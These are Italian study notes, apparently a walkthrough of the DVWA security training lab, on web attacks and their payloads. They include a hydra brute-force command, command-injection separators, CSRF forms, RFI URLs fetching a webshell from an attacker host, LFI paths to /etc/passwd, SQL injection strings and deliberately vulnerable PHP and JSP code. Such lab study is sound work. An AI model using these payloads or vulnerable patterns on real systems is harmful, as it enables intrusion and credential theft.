<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [DVWA](#dvwa)
  - [Brute force](#brute-force)
  - [Command injection](#command-injection)
  - [CSRF](#csrf)
  - [File inclusion](#file-inclusion)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# DVWA

> http://www.dvwa.co.uk/

- DVWA
	- Host: 172.0.17.2
	- Default credentials: admin/password
- Malicious web server
	- Host: 172.0.17.3

## Brute force

- recupera un PHPSESSID valido (`$1`)

- lancia:

	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"`

	"RELATIVE PATH:PARAMETERS:FAILED LOGIN TEXT:REQUEST COOKIES"

## Command injection

- inserisci i seguenti valori:

	`; CMD`

	`&& CMD`

	`& CMD`

	`| CMD`

## CSRF

Cross-Site Request Forgery forza l'utente a fare una richiesta malevola a un sito su cui è autenticato.
L'attacco ha come obiettivo le richieste che cambiano lo stato interno del server, non il furto di dati, infatti l'attaccante non ha modo di vedere la risposta alla richiesta malevola.
Si ha una vulnerabilità "stored CSRF" quando l'attaccante è in grado di rendere persistente l'attacco direttamente sul sito vulnerabile.
A tale scopo si memorizza un tag IMG o IFRAME in un campo che accetta HTML o si realizza un più complesso attacco di XSS.

Esempi (metodo GET):

```
<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>
```

o

```
<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">
```

Esempi (metodo POST):

```
<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
<input type="hidden" name="acct" value="MARIA"/>
<input type="hidden" name="amount" value="100000"/>
<input type="submit" value="View my pictures"/>
</form>
```

o

```
<body onload="document.forms[0].submit()">
<form...>
```

o

```
<script>
function put() {
	var x = new XMLHttpRequest();
	x.open("PUT","http://bank.com/transfer.do",true);
	x.setRequestHeader("Content-Type", "application/json"); 
	x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
}
</script>

<body onload="put()">
```

L'ultima richiesta **non** viene eseguita dai moderni browser grazie alla restrizione *same-origin policy*.
Questa protezione è abilitata di default, a meno che il server abiliti esplicitamente le richieste cross-origin da uno o più siti usando CORS con l'header `Access-Control-Allow-Origin: *`.

## File inclusion

Questa vulnerabilità si ha quando un'applicazione crea un path per codice eseguibile usando una variabile che è sotto il controllo dell'attaccante,
in un modo che gli permette di controllare quale file viene eseguito.
Sfruttando una vulnerabilità di questo tipo permette una RCE sul server che esegue l'appicazione vulnerabile.

- Remote File Inclusion

	L'applicazione scarica ed esegue un file remoto.

	Exploit:

		http://localhost/vulnerabilities/fi/?page=http://172.17.0.3/rfi.php

- Local File Inclusion

	Come il RFI ma il file sfruttato è presente sul server.

	Exploit:

		http://localhost/vulnerabilities/fi/?page=/etc/passwd

#### PHP

Funzioni che includono un file per l'esecuzione sono `include` e `require`.
La direttiva `allow_url_fopen` o `allow_url_include` (in `php.ini`) abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
Anche se disabilitato è raggirabile con compressione (`zlib://`) o stream audio (`ogg://`) che non ispezionano il flag URL PHP interno.
Si possono sfruttare anche i wrapper PHP come `php://input`.

Codice vulnerabile:

```
<form method="get">
   <select name="language">
      <option value="english">English</option>
      <option value="french">French</option>
      ...
   </select>
   <input type="submit">
</form>

<?php
   if ( isset( $_GET['language'] ) ) {
      include( $_GET['language'] . '.php' );
   }
?>
```

Exploit:

```
/vulnerable.php?language=http://evil.example.com/webshell.txt?
/vulnerable.php?language=C:\\ftp\\upload\\exploit
/vulnerable.php?language=C:\\notes.txt%00
/vulnerable.php?language=../../../../../etc/passwd%00
/vulnerable.php?language=../../../../../proc/self/environ%00
```

#### JSP

Anche le JSP sono vulnerabili a Null byte injection (`%00`)

Codice vulnerabile:

```
<%
   String p = request.getParameter("p");
   @include file="<%="includes/" + p +".jsp"%>"
%>
```

Exploit:

```
/vulnerable.jsp?p=../../../../var/log/access.log%00
```

## File upload

L'attaccante carica un file a suo piacimento per poi eseguirlo in altro modo.
L'attaccante può sovrascrivere file già presenti sul server sfruttando path e filename presenti nei metadati HTTP.
Altri problemi si hanno se dimensione o contenuto del file vengono manipolati.

- crea un file fu.php col seguente contenuto

```
<?php
 
phpinfo();

?>
```

- carica il file tramite la funzione

- visita `http://localhost/hackable/uploads/fu.php`

## Insecure CAPTCHA

Il codice fa il controllo sul valore di `$_POST[ 'step' ]`.
Se vale `1` valuta il CAPTCHA, diversamente (`2`) esegue l'operazione di cambio password.

- modifico il valore di `step` a `2` e inserisco la password di mio piacimento (il codice non entra nel ramo if che controlla il CAPTCHA)

## SQL injection

Devo iniettare del codice che verifichi la condizione WHERE.

Codice vulnerabile:

`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`

Exploit:

`' or 'a' = 'a`

## SQL injection (blind)

L'attaccante si aspetta a seguito della query al database una risposta `true` o `false`.
Osservando le risposte l'attaccante può estrarre informazioni rilevanti.
Se il contenuto dell pagina che ritorna `true` è diverso da quella che ritorna `false`, l'attaccante è in grado di distinguere quando la query eseguita ritorna `true` o `false`.

Codice vulnerabile:

```php
// Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors 
```

Exploit:

`' or '1'='1`

